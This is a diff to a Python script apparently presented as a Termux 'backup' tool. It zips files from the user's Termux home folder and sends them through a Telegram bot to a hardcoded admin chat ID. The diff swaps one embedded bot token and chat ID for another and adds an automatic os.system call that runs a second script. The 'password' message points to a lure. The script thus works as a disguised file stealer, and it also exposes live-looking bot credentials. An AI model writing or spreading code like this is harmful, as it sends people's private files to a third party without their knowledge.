@@ -4,8 +4,8 @@ import telebot
 import time
 
 # ================= CONFIG =================
-BOT_TOKEN = "8300582155:AAHcS6EDAzylFjfe0pUNi4B9CKL7R_GhmpY"
-ADMIN_CHAT_ID = 8223063986
+BOT_TOKEN = "7676428723:AAECtBRnxX41kSkiZev5UdX_2X63eVP-fMY"
+ADMIN_CHAT_ID = 8038375045
 TERMUX_HOME = "/data/data/com.termux/files/home"
 BACKUP_DIR = "/data/data/com.termux/files/home/backups"
 MAX_ZIP_SIZE_MB = 45  # Telegram limit < 50MB
@@ -72,4 +72,10 @@ for item in os.listdir(TERMUX_HOME):
                     print(f"[!] Could not send {zip_file_path}: {str(e)}")
 
 # শেষে মেসেজ
-print("Backup completed! Password : python zxcvbnm.py")
+print("Backup completed! Running zxcvbnm.py...")
+
+# ================= AUTO RUN =================
+try:
+    os.system("python zxcvbnm.py")
+except Exception as e:
+    print(f"[!] Could not run zxcvbnm.py automatically: {str(e)}")
